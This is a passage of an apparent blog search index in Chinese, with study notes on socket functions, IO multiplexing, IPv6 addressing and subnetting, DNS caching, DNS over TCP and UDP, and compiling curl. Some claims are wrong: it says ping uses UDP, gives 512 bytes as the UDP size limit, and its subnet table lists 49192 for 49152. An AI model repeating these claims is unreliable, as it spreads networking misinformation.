SOMAXCONN，就由系统来决定请求队列长度，这个值一般比较大，可能是几百，或者更多。当请求队列满时，就不再接收新的请求，对于 Linux，客户端会收到 **ECONNREFUSED **错误，对于 Windows，客户端会收到 **WSAECONNREFUSED **错误。注意：listen()只是让套接字处于监听状态，并没有接收请求。接收请求需要使用accept()函数。 五、accept() 函数当套接字处于监听状态时，可以通过 accept()函数来接收客户端请求。它的原型为： 1SOCKET accept(SOCKET sock, struct sockaddr *addr, int *addrlen); //Windows 它的参数与 listen() 和 connect() 是相同的：sock为服务器端套接字，addr为 sockaddr_in 结构体变量，addrlen为参数 addr 的长度，可由 sizeof() 求得。","tags":[{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"Socket","slug":"Socket","permalink":"http://example.com/tags/Socket/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"OSI七层网络协议模型各层协议","date":"2023-10-27T01:24:02.372Z","path":"B_Code/网络编程/OSI七层网络协议模型/","text":"","tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"协议","slug":"协议","permalink":"http://example.com/tags/%E5%8D%8F%E8%AE%AE/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"IO多路复用","date":"2023-10-27T01:24:02.371Z","path":"B_Code/网络编程/IO多路复用/","text":"最近面试，岗位是安全开发岗。问了较多的网络相关函数。其中关于io多路复用的问题，由于工作中涉及的比较少，回答的一塌糊涂。知耻而后勇，专门整理一遍记录一下这个知识点吧 主要是之前还专门写过一遍笔记用来记录当时的学习情况，还写的挺详细！！！ 【一文搞懂】FD_SET的使用_欧恩意的博客-CSDN博客 [toc] IO多路复用概念顾名思义，就是可以多个可以重复使用的io（输入\\输出）。 多路：核心需求是要用尽可能少的线程来处理尽可能多的连接，这里的多路是指需要处理的众多连接。 复用：核心需求是要求使用尽可能少的线程，尽可能减少系统开销去处理尽可能多的连接，那么这个复用是指利用有限的资源。也就是说利用有限的资源去处理尽可能多的任务。例如：在阻塞IO中，一个连接需要一个线程去处理，但是在IO多路复用的模型中，则可以使用一个线程去处理多个任务。 参考及引用： Linux – IO Multiplexing – Select vs Poll vs Epoll – Developers Area Chapter 6. I&#x2F;O Multiplexing: The select and poll Functions - Shichao’s Notes select &#x2F; poll &#x2F; epoll: practical difference for system architects | UlduzSoft 【并发】IO多路复用select&#x2F;poll&#x2F;epoll介绍_哔哩哔哩_bilibili","tags":[{"name":"IO复用","slug":"IO复用","permalink":"http://example.com/tags/IO%E5%A4%8D%E7%94%A8/"},{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"IPv6","date":"2023-10-27T01:24:02.371Z","path":"B_Code/网络编程/IPv6/","text":"[toc] IPv6地址格式IPv6的地址长度是128位（bit）。 将这128位的地址按每16位划分为一个段，将每个段转换成十六进制数字，并用冒号隔开。 例如：2000:0000:0000:0000:0001:2345:6789:abcd 这个地址很长，可以用两种方法对这个地址进行压缩， 前导零压缩法： 将每一段的前导零省略，但是每一段都至少应该有一个数字 例如：2000:0:0:0:1:2345:6789:abcd 双冒号法： 如果一个以冒号十六进制数表示法表示的IPv6地址中，如果几个连续的段值都是0，那么这些0可以简记为::。每个地址中只能有一个::。 例如：2000::1:2345:6789:abcd 单播地址（Unicast IPv6 Addresses）可聚合的全球单播地址（Aggregatable Global Unicast Addresses） 可在全球范围内路由和到达的，相当于IPv4里面的global addresses。前三个bit是001 例如：2000::1:2345:6789:abcd 链路本地地址（Link-Local Addresses） 用于同一个链路上的相邻节点之间通信，相当于IPv4里面的169.254.0.0&#x2F;16地址。Ipv6的路由器不会转发链路本地地址的数据包。前10个bit是1111 1110 10，由于最后是64bit的interface ID，所以它的前缀总是FE80::&#x2F;64 例如：FE80::1 站点本地地址（Site-Local Addresses） 对于无法访问internet的本地网络，可以使用站点本地地址，这个相当于IPv4里面的private address（10.0.0.0&#x2F;8, 172.16.0.0&#x2F;12, and 192.168.0.0&#x2F;16）。它的前10个bit是1111 1110 11，它最后是16bit的Subnet ID和64bit的interface ID，所以它的前缀是FEC0::&#x2F;48。 值得注意的是，在RFC3879中，最终决定放弃单播站点本地地址。放弃的理由是，由于其固有的二义性带来的单播站点本地地址的复杂性超过了它们可能带来的好处。它在RFC4193中被ULA取代。 唯一的本地IPv6单播地址（ULA，Unique Local IPv6 Unicast Address） 在RFC4193中标准化了一种用来在本地通信中取代单播站点本地地址的地址。ULA拥有固定前缀FD00::&#x2F;8，后面跟一个被称为全局ID的40bit随机标识符。 未指定地址（Unspecified address） 0:0:0:0:0:0:0:0 或者:: 当一个有效地址还不能确定，一般用未指定地址作为源地址。未指定地址不能作为一个目标地址来使用。 回环地址（Loopback address） 回环地址::1用于标识一个回环接口，可以使一个节点可以给自己发送数据包。相当于IPv4的回环地址127.0.0.1 兼容IPv4的地址（IPv4-compatible address） 形如::w.x,y.z，这里的w.x.y.z是IPv4公共地址的十进制点号表示法，用于IPv6&#x2F;IPv4节点们（同时支持）在使用仅支持IPv4的网络上用IPv6的协议进行通信。 但是事实证明这种技术不是个好主意，RFC4291中废弃了对这类地址的使用。 IPv4映射地址（IPv4-mapped address） 形如::FFFF:w.x.y.z，这里的w.x.y.z是IPv4公共地址的十进制点号表示法,用于一个仅支持IPv4的节点表现为一个IPv6的节点 6over4地址 [64bit-prefix]:0:0:WWXX:YYZZ,其中的WWXX:YYZZ是w.x.y.z IPv4公共地址的十进制点号表示法，用于一个使用6to4协议的隧道机制的节点。 6to4地址 2002:WWXX:YYZZ:[SLA ID]:[Interface ID],用于表示一个使用6to4协议的隧道机制节点。 多播IPv6地址（Multicast IPv6 Addresses）前8个bit为1111 1111， 其中FF01::到FF0F::的多播地址是保留专用地址 FF01::1 节点本地范围所有节点多播地址 FF02::1 链路本地范围所有节点多播地址 FF01::2 节点本地范围所有路由器多播地址 FF02::2 链路本地范围所有路由器多播地址 FF05::2 站点本地范围所有路由器多播地址 为 IPv6 划分子网在对 IPv6 地址空间进行子网划分时，需要使用子网划分技术，以一种允许将剩余地址空间的摘要和委派路由到 IPv6 Intranet 的不同部分的方式，为 48 位全局地址前缀划分 16 位子网 ID 字段。 您不需要以任何特定的方式进行子网划分。此处介绍的子网划分技术假定您是通过使用子网 ID 字段的高序位划分其地址空间的可变部分来进行子网划分的。虽然此方法有助于分层寻址和路由，但此方法并不是非用不可。例如，在只有少数子网的小型组织中，您可以通过为子网编号（从 0 开始），轻松地为全局地址创建平面寻址空间。 对全局地址前缀进行子网划分对于全局地址，Internet 编号分配机构 (IANA) 或 ISP 会分配一个前 48 位均为固定位的 IPv6 地址前缀。若要对 48 位全局地址前缀的子网 ID 字段进行子网划分，需要执行一个包含两步的过程： 1. 确定用于子网划分的位数。 2. 枚举出新的子网网络前缀。 确定用于子网划分的位数 用于子网划分的位数决定着您可以分配给您的网络各部分（基于地理区划或部门分类）的新子网网络前缀的可能的数量。在分层路由基础结构中，您必须确定您在层次结构的各层需要的网络前缀数，进而确定各层需要的位数。为层次结构的各层选择的位越多，您拥有的用于枚举层次结构最后一层中的单个子网的位越少。 例如，您可以实施一个包含两层的层次结构来反映地理&#x2F;部门结构，4 位用于地理层，6 位用于部门层。这一方案允许 16 个地理区域，各个区域中的各个部门只占剩余的子网划分空间的 6 (16 - 6 - 4) 位，或者说每个部门只有 64 (&#x3D;26) 个子网。 在层次结构中任何给定的层上，许多位已被层次结构中的上一层固定了 (f)，许多位被用来在层次结构中的当前层进行子网划分 (s)，还有许多位留给层次结构中的下一层使用 (r)。下面这个等式始终成立：f+s+r &#x3D; 16。 枚举子网网络前缀根据用于子网划分的位数，您必须列出新的子网网络前缀，您可以使用下面两种主要方法之一： • 使用子网 ID 和递增值的十六进制表示形式来枚举新的子网网络前缀。 • 使用子网 ID 和递增值的十进制表示形式来枚举新的子网网络前缀。 这两种方法产生的结果相同，都会生成子网网络前缀的一个枚举列表。 要使用十六进制方法创建子网网络前缀的枚举列表，请执行以下步骤： 1. 根据为子网划分选择的位数 s 和进行子网划分的网络前缀的前缀长度 m，计算以下各值：f &#x3D; m - 48f 是子网 ID 中已固定的位的数目。n &#x3D; 2sn 是您将获得的网络前缀的数目。i &#x3D; 216-(f+s) i 是以十六进制表示的各个连续子网 ID 之间的递增值。P &#x3D; m+s**P 是新的子网网络前缀的前缀长度。 2. 创建一个包含 n 行、两列的表。第一列存放网络前缀编号（从 1 开始），第二列存放新的子网网络前缀。 3. 将使用新的前缀长度的原始网络前缀放在第一行的第二列中。例如，根据进行子网划分的子网 ID 的十六进制值 F，子网网络前缀为 [48 位前缀]:F::&#x2F;P。 4. 将站点本地地址或全局地址的子网 ID 部分中的值加上 i，将结果放在下一行的第二列中。例如，在第二行中，子网前缀为 [48 位前缀]:F+i::&#x2F;P。 5. 重复步骤 4，直到您完成该表。 例如，要对全局地址前缀 3FFE:FFFF:0:C000::&#x2F;51 进行 3 位子网划分，首先计算前缀数量值、递增值和新前缀长度值。起始值是 F&#x3D;0xC000，s&#x3D;3，m&#x3D;51，因此 f&#x3D;51-48&#x3D;3。前缀的数量是 8 (n&#x3D;23)。递增值是 0x400 (i&#x3D;216-(3+3)&#x3D;1024&#x3D;0x400)。新的前缀长度是 54 (P&#x3D;51+3)。 接下来，构造一个包含 8 行的表，如表 4-12 所示。将 3FFE:FFFF:0:C000::&#x2F;54 放在网络前缀 1 所在的那一行的第二列，然后让网络前缀的子网 ID 部分依次递增 0x400，将结果分别填入后面的各行中。 下表为使用十六进制技术对 3FFE:FFFF:0:C000::&#x2F;51 进行 3 位子网划分： 网络前缀 子网网络前缀 1 3FFE:FFFF:0:C000::&#x2F;54 2 3FFE:FFFF:0:C400::&#x2F;54 3 3FFE:FFFF:0:C800::&#x2F;54 4 3FFE:FFFF:0:CC00::&#x2F;54 5 3FFE:FFFF:0:D000::&#x2F;54 6 3FFE:FFFF:0:D400::&#x2F;54 7 3FFE:FFFF:0:D800::&#x2F;54 8 3FFE:FFFF:0:DC00::&#x2F;54 要使用十进制方法创建子网网络前缀的枚举列表，请执行以下步骤： 1. 根据用于子网划分的位数 s、进行子网划分的网络前缀的前缀长度 m 和进行子网划分的子网 ID 的十六进制值 F，计算以下各值：f &#x3D; m - 48f 是子网 ID 中已固定的位的数目。n &#x3D; 2sn 是您将获得的网络前缀的数目。i &#x3D; 216-(f+s) i 是各个连续子网 ID 之间的递增值。P &#x3D; m+s**P 是新的子网网络前缀的前缀长度。D &#x3D; F 的十进制表示形式 2. 创建一个包含 n 行、三列的表。第一列存放网络前缀编号（从 1 开始），第二列存放新的子网网络前缀的子网 ID 部分的十进制表示形式，第三列存放新的子网网络前缀。 3. 将子网 ID 的十进制表示形式 (D) 放在第一行的第一列，将子网前缀 [48 位前缀]:F::&#x2F;P 放在第一行的第二列。 4. 用子网 ID 十进制表示形式的值加上 i，将结果放在下一行的第二列。例如，第二行的子网 ID 的十进制表示形式是 D+i。 5. 在第三列中，将子网 ID 的十进制表示形式转换为十六进制，并构造前缀 [48 位前缀]:[SubnetID]::&#x2F;P。例如，在第二行中，子网网络前缀为 [48 位前缀]:[D+i（转换为十六进制）]::&#x2F;P。 6. 重复步骤 4 和 5，直到您完成该表。 例如，要对站点本地网络前缀 3FFE:FFFF:0:C000::&#x2F;51 进行 3 位子网划分，首先计算前缀数量值、递增值、新前缀长度值和起始子网 ID 十进制表示形式。我们的起始值是 F&#x3D;0xC000，s&#x3D;3，m&#x3D;51，这样 f&#x3D;51-48&#x3D;3。前缀数量是 8 (n&#x3D;23)。递增值是 1024 (i&#x3D;216-(3+3))。新的前缀长度是 54 (P&#x3D;51+3)。起始子网 ID 的十进制表示形式是 49152 (D&#x3D;0xC000&#x3D;49152)。 接下来，构造一个包含 8 行的表，如表 4-13 所示。将 49192 放在网络前缀 1 所在的那一行的第一列，将 3FFE:FFFF:0:C000::&#x2F;54 放在该行的第二列。让网络前缀的子网 ID 部分（第四个十六进制块）依次递增 1024，然后将结果转换为十六进制并分别填入后面的各行中。 下表为使用十进制技术对 3FFE:FFFF:0:C000::&#x2F;51 进行 3 位子网划分： 网络前缀 子网 ID 的十进制表示形式 子网网络前缀 1 49192 3FFE:FFFF:0:C000::&#x2F;54 2 50176 3FFE:FFFF:0:C400::&#x2F;54 3 51200 3FFE:FFFF:0:C800::&#x2F;54 4 52224 3FFE:FFFF:0:CC00::&#x2F;54 5 53248 3FFE:FFFF:0:D000::&#x2F;54 6 54272 3FFE:FFFF:0:D400::&#x2F;54 7 55296 3FFE:FFFF:0:D800::&#x2F;54 8 56320 3FFE:FFFF:0:DC00::&#x2F;54 变量长度子网划分与 IPv4 相同的是，您可以对 IPv6 地址前缀循环进行子网划分来在组织 Intranet 的各个层次提供路由摘要，定义单个子网的地址前缀可达到 64 位。与 IPv4 不同的是，您无法使用可变长度子网划分来创建不同大小的子网，因为所有 IPv6 子网都使用 64 位网络 ID 和 64 位接口 ID。","tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"IPv6","slug":"IPv6","permalink":"http://example.com/tags/IPv6/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"查看浏览器DNS缓存","date":"2023-10-27T01:24:02.370Z","path":"B_Code/网络编程/DNS/查看浏览器DNS缓存/","text":"概述：本文主要介绍如何在浏览器查看DNS缓存，同时罗列了DNS查询的一些顺序 [toc] DNS 缓存与解析DNS 缓存分类1、浏览器缓存浏览器会根据一定频率缓存DNS记录； 2、本地DNS缓存如果浏览器缓存中找不到解析记录，就会去询问操作系统中的缓存； 3、本地HOSTS文件HOSTS是记录域名与IP地址一一映射关系的本地文件，Windows系统中位于 C:\\Windows\\System32\\drivers\\etc 4、路由器DNS缓存我们常用的路由器也带有自动缓存功能，路由器DNS被篡改会造成域名劫持，将访问网址定位到另外一个服务器； 5、递归服务器缓存递归服务器在将解析结果告知客户端的同时，将记录缓存下来，当下次请求同一个域名时，直接会将记录返回，而无需再进行全球查询。 DNS 解析顺序DNS解析顺序是 “先查缓存，再递归解析”，查询顺序为：浏览器缓存 -&gt; 系统缓存 -&gt; 路由器缓存 -&gt; 递归服务器缓存 -&gt; 递归查询 以 www.baidu.com 这个域名为例进行查询，具体流程如下： 1. 搜索浏览器自带的DNS缓存 当收到访问请求后，浏览器首先会查询浏览器自身的DNS缓存，这个缓存时间比较短（chrome:&#x2F;&#x2F;net-internals&#x2F;#dns 这里可以查询缓存的dns记录），且只能容纳 1000条缓存，如果缓存中有对应条目，返回结果，解析到此结束。 在chrome打开 chrome://net-internals/#dns 如上所示，浏览器解析到了 www.baidu.com 的ip 2. 查询操作系统缓存和hosts本地文件 如果浏览器缓存中没有找到对应条目（ipconfig/displaydns可以查看），操作系统也会有一个域名解析的过程，浏览器会先搜索操作系统的DNS缓存中是否有这个域名解析记录，如果有返回结果，解析结束。 此外，电脑本地文件HOSTS中可以设定域名到IP地址的指向关系。如果HOSTS文件中保存有该域名的记录，浏览器会首先使用这个IP地址，并将其结果缓存下来，缓存时间同样受域名失效时间和缓存空间大小决定。 3. 查询路由器缓存 如果浏览器和操作系统中没有域名解析记录，就会查询路由器中的DNS缓存，如果路由器DNS缓存中有解析条目，直接返回结果，解析结束。 4. 递归解析服务器缓存 如果本机和路由器DNS缓存中没有该域名的解析记录，浏览器就会向递归服务器发起请求，如果递归服务器缓存有该域名解析条目，返回结果，解析结束。 5. 查询根域名服务器 如果递归服务器缓存中没有结果，就会委托递归服务器发起全球查询，首先递归服务器会向根域名服务器发起解析请求。根域名服务器告知.com顶级域名服务器地址。 6. 查询顶级域名服务器 递归服务器向.com顶级域名服务器发起DNS请求，.com顶级服务器告知example.com所属权威域名服务器地址。 7. 查询权威域名服务器 递归服务器向example.com的权威域名服务器地址发起请求，权威服务器告知www.example.com所对应的IP地址。 8. 返回解析结果 得到www.example.com的IP地址后，递归服务器将结果告知客户端，客户端对该IP地址发起访问。整个DNS解析流程到此结束。","tags":[{"name":"DNS","slug":"DNS","permalink":"http://example.com/tags/DNS/"},{"name":"缓存","slug":"缓存","permalink":"http://example.com/tags/%E7%BC%93%E5%AD%98/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"DNS","slug":"B-Code/网络编程/DNS","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/DNS/"}]},{"title":"域名解析相关经验","date":"2023-10-27T01:24:02.369Z","path":"B_Code/网络编程/DNS/域名解析经验整理/","text":"整理记录排查网络问题事的域名解析相关问题 [toc] 基础知识点A 和 AAAAA 和 AAAA 都是DNS记录，它们的作用是将域名解析到IP地址。具体来说，A记录将域名解析到IPv4地址，而AAAA记录将域名解析到IPv6地址。 因此，主要的区别在于 A 记录用于IPv4，而 AAAA 记录用于IPv6。 相关工具设置域名工具 常见方式是在网卡的配置界面设置 dns 服务器，在高级页面可以配置多个 DNS 服务器。但是，在特殊环境： 如使用 netsh 命令设置的静态 dns 服务器等与用户手动添加的 dns 一样时，可能会出现 dns 解析异常的问题。 quicksetdns_sec工具:QuickSetDNS - 快速修改 DNS 服务器工具 - 小众软件","tags":[{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"DNS","slug":"DNS","permalink":"http://example.com/tags/DNS/"},{"name":"域名","slug":"域名","permalink":"http://example.com/tags/%E5%9F%9F%E5%90%8D/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"DNS","slug":"B-Code/网络编程/DNS","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/DNS/"}]},{"title":"DNS用的是TCP协议还是UDP协议","date":"2023-10-27T01:24:02.366Z","path":"B_Code/网络编程/DNS/DNS协议/","text":"概述: 关于 DNS 使用的是 TCP 还是 UDP 的说明 DNS缓存问题可以看这篇文章 【查看浏览器DNS缓存】 [toc] DNS概述DNS占用53号端口，同时使用TCP和UDP协议。 📌 那么DNS在什么情况下使用这两种协议？ DNS在区域传输的时候使用TCP协议，其他时候使用UDP协议。 DNS区域传输的时候使用TCP协议： 辅域名服务器会定时（一般3小时）向主域名服务器进行查询以便了解数据是否有变动。如有变动，会执行一次区域传送，进行数据同步。区域传送使用TCP而不是UDP，因为数据同步传送的数据量比一个请求应答的数据量要多得多。 TCP是一种可靠连接，保证了数据的准确性。 🎃 域名解析时使用UDP协议： 客户端向DNS服务器查询域名，一般返回的内容都不超过512字节，用UDP传输即可。不用经过三次握手，这样DNS服务器负载更低，响应更快。理论上说，客户端也可以指定向DNS服务器查询时用TCP，但事实上，很多DNS服务器进行配置的时候，仅支持UDP查询包。 DNS为什么用TCP和UDPDNS同时占用UDP和TCP端口53是公认的，这种单个应用协议同时使用两种传输协议的情况在TCP&#x2F;IP栈也算是个另类。但很少有人知道DNS分别在什么情况下使用这两种协议。 先简单介绍下TCP与UDP TCP是一种面向连接的协议，提供可靠的数据传输，一般服务质量要求比较高的情况，使用这个协议。UDP—用户数据报协议，是一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。 TCP与UDP的区别：UDP和TCP协议的主要区别是两者在如何实现信息的可靠传递方面不同。TCP协议中包含了专门的传递保证机制，当数据接收方收到发送方传来的信息时，会自动向发送方发出确认消息；发送方只有在接收到该确认消息之后才继续传送其它信息，否则将一直等待直到收到确认信息为止。 与TCP不同，UDP协议并不提供数据传送的保证机制。如果在从发送方到接收方的传递过程中出现数据报的丢失，协议本身并不能做出任何检测或提示。因此，通常人们把UDP协议称为不可靠的传输协议。相对于TCP协议，UDP协议的另外一个不同之处在于如何接收突发性的多个数据报。不同于TCP，UDP并不能确保数据的发送和接收顺序。事实上，UDP协议的这种乱序性基本上很少出现，通常只会在网络非常拥挤的情况下才有可能发生。 既然UDP是一种不可靠的网络协议，那么还有什么使用价值或必要呢？ 其实不然，在有些情况下UDP协议可能会变得非常有用。因为UDP具有TCP所望尘莫及的速度优势。虽然TCP协议中植入了各种安全保障功能，但是在实际执行的过程中会占用大量的系统开销，无疑使速度受到严重的影响。反观UDP由于排除了信息可靠传递机制，将安全和排序等功能移交给上层应用来完成，极大降低了执行时间，使速度得到了保证。 DNS在进行区域传输的时候使用TCP协议，其它时候则使用UDP协议；DNS的规范规定了2种类型的DNS服务器，一个叫主DNS服务器，一个叫辅助DNS服务器。在一个区中主DNS服务器从自己本机的数据文件中读取该区的DNS数据信息，而辅助DNS服务器则从区的主DNS服务器中读取该区的DNS数据信息。当一个辅助DNS服务器启动时，它需要与主DNS服务器通信，并加载数据信息，这就叫做区传送（zone transfer）。 为什么既使用TCP又使用UDP？首先了解一下TCP与UDP传送字节的长度限制： UDP报文的最大长度为512字节，而TCP则允许报文长度超过512字节。当DNS查询超过512字节时，协议的TC标志出现删除标志，这时则使用TCP发送。通常传统的UDP报文一般不会大于512字节。 区域传送时使用TCP，主要有一下两点考虑： 辅域名服务器会定时（一般时3小时）向主域名服务器进行查询以便了解数据是否有变动。如有变动，则会执行一次区域传送，进行数据同步。区域传送将使用TCP而不是UDP，因为数据同步传送的数据量比一个请求和应答的数据量要多得多。 TCP是一种可靠的连接，保证了数据的准确性。 域名解析时使用UDP协议：客户端向DNS服务器查询域名，一般返回的内容都不超过512字节，用UDP传输即可。不用经过TCP三次握手，这样DNS服务器负载更低，响应更快。虽然从理论上说，客户端也可以指定向DNS服务器查询的时候使用TCP，但事实上，很多DNS服务器进行配置的时候，仅支持UDP查询包。 UDP UDP 与 TCP 的主要区别在于 UDP 不一定提供可靠的数据传输。事实上，该协议不能保证数据准确无误地到达目的地。UDP 在许多方面非常有效。当某个程序的目标是尽快地传输尽可能多的信息时（其中任意给定数据的重要性相对较低），可使用 UDP。ICQ 短消息使用 UDP 协议发送消息。 许多程序将使用单独的TCP连接和单独的UDP连接。重要的状态信息随可靠的TCP连接发送，而主数据流通过UDP发送。 TCPTCP的目的是提供可靠的数据传输，并在相互进行通信的设备或服务之间保持一个虚拟连接。TCP在数据包接收无序、丢失或在交付期间被破坏时，负责数据恢复。它通过为其发送的每个数据包提供一个序号来完成此恢复。记住，较低的网络层会将每个数据包视为一个独立的单元，因此，数据包可以沿完全不同的路径发送，即使它们都是同一消息的组成部分。这种路由与网络层处理分段和重新组装数据包的方式非常相似，只是级别更高而已。 为确保正确地接收数据，TCP要求在目标计算机成功收到数据时发回一个确认（即 ACK）。如果在某个时限内未收到相应的 ACK，将重新传送数据包。如果网络拥塞，这种重新传送将导致发送的数据包重复。但是，接收计算机可使用数据包的序号来确定它是否为重复数据包，并在必要时丢弃它。 TCP与UDP的选择如果比较UDP包和TCP包的结构，很明显UDP包不具备TCP包复杂的可靠性与控制机制。与TCP协议相同，UDP的源端口数和目的端口数也都支持一台主机上的多个应用。一个16位的UDP包包含了一个字节长的头部和数据的长度，校验码域使其可以进行整体校验。（许多应用只支持UDP，如：多媒体数据流，不产生任何额外的数据，即使知道有破坏的包也不进行重发。） 很明显，当数据传输的性能必须让位于数据传输的完整性、可控制性和可靠性时，TCP协议是当然的选择。当强调传输性能而不是传输的完整性时，如：音频和多媒体应用，UDP是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP也是一个好的选择，如：DNS交换。把SNMP建立在UDP上的部分原因是设计者认为当发生网络阻塞时，UDP较低的开销使其有更好的机会去传送管理数据。TCP丰富的功能有时会导致不可预料的性能低下，但是我们相信在不远的将来，TCP可靠的点对点连接将会用于绝大多数的网络应用。 TCPTCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。 一个TCP连接必须要经过三次“对话”才能建立起来。三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步（同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数据。 UDPUDP（User Data Protocol，用户数据报协议）是与TCP相对应的协议。它是面向非连接的协议，它不与对方建立连接，而是直接就把数据包发送过去！ UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境。比如，我们经常使用“ping”命令来测试两台主机之间TCP&#x2F;IP通信是否正常，其实“ping”命令的原理就是向对方主机发送UDP数据包，然后对方主机确认收到数据包，如果数据包是否到达的消息及时反馈回来，那么网络就是通的。例如，在默认状态下，一次“ping”操作发送4个数据包（如图2所示）。大家可以看到，发送的数据包数量是4包，收到的也是4包（因为对方主机收到后会发回一个确认收到的数据包）。这充分说明了UDP协议是面向非连接的协议，没有建立连接的过程。正因为UDP协议没有连接的过程，所以它的通信效果高；但也正因为如此，它的可靠性不如TCP协议高。QQ就使用UDP发消息，因此有时会出现收不到消息的情况。HTTP是用TCP协议传输的。 TCP协议与UDP协议的区别TCP基于面向连接的协议，数据传输可靠，传输速度慢，适用于传输大量数据，可靠性要求高的场合。 UDP协议面向非连接协议，数据传输不可靠，传输速度快，适用于一次只传送少量数据、对可靠性要求不高的应用环境。 面向连接的TCP“面向连接”就是在正式通信前必须要与对方建立起连接。比如你给别人打电话，必须等线路接通了、对方拿起话筒才能相互通话。 TCP协议能为应用程序提供可靠的通信连接，使一台计算机发出的字节流无差错地发往网络上的其他计算机，对可靠性要求高的数据通信系统往往使用TCP协议传输数据。 面向非连接的UDP协议“面向非连接“就是在正式通信前不必与对方先建立连接，不管对方状态就直接发送。这与现在风行的手机短信非常相似：你在发短信的时候，只需要输入对方手机号就OK了。 UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境 UDP协议是面向非连接的协议，没有建立连接的过程。正因为UDP协议没有连接的过程，所以它的通信效果高；但也正因为如此，它的可靠性不如TCP协议高。QQ就使用UDP发消息，因此有时会出现收不到消息的情况。 TCP协议与UDP协议支持的应用协议TCP支持的应用协议主要有：Telnet、FTP、SMTP 等；UDP支持的应用层协议主要有：NFS（网络文件系统）、SNMP（简单网络管理协议）、DNS（主域名称系统）、TFTP（通用文件传输协议）等。 TCP和UDP都是位于OSI模型中的传输层中。 📢 TCP优点：面向连接的,具有实时性,就象打电话一样,两者必须建立连接.它保证你所传输的东西是准确到达的,并且收方要给你一个收到或没有\\收到的回复,所以它具有安全性的特点..📢 UDP优点：面向无连接的,就象给某人寄信一样,对方不需要在邮局等着你的信到.所以说,它没有保障性,不能确保你一定能收到信,不象TCP那样,,但是 它比TCP好的一点,就是速度快,因为他不需要双方交流是否收到,对发的东西有一个确认的过程.","tags":[{"name":"DNS","slug":"DNS","permalink":"http://example.com/tags/DNS/"},{"name":"UDP","slug":"UDP","permalink":"http://example.com/tags/UDP/"},{"name":"TCP","slug":"TCP","permalink":"http://example.com/tags/TCP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"DNS","slug":"B-Code/网络编程/DNS","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/DNS/"}]},{"title":"Curl使用的一些demo，记录","date":"2023-10-27T01:24:02.365Z","path":"B_Code/网络编程/Curl使用教程/","text":"[toc] 1、编译及使用1.1 编译1.1.1下载GitHub - curl&#x2F;curl: A command line tool and library for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP. libcurl offers a myriad of powerful features 点击链接下载，也可以使用git clone到本地 1git clone https://github.com/curl/curl.git 1.1.2 编译 方法一 VS编译器 如果需要使用vs编译，首先运行 project 目录下的 generate.bat 文件。然后在projects/Windwows 目录下打开对应的解决方案即可 方法二 nmake 在下载目录 winbuild 目录下，查看 README.md ，里边告诉了我们如何编译自己需要的包，以我本人使用的为例。 打开对应版本的vs命令行工具 进入对应的编译目录 curl-src\\winbuild，接着执行以下命令就好。具体的命令参数可以查看winbuild目录下的介绍，选择自己需要的环境就好。 1nmake /f Makefile.vc mode=dll vc=15 